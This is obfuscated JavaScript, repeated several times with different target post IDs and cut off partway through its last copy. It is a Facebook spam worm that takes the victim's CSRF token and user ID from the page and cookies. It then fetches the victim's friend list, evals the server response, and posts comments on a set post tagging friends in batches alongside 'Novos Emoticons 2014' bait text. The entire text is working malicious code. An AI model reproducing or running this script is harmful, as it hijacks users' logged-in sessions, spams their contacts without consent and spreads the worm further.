_0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","399162470227562","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","449884268476458","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","441987669266118","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","447941725337379","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","536476583137813","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","454755387989346","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var 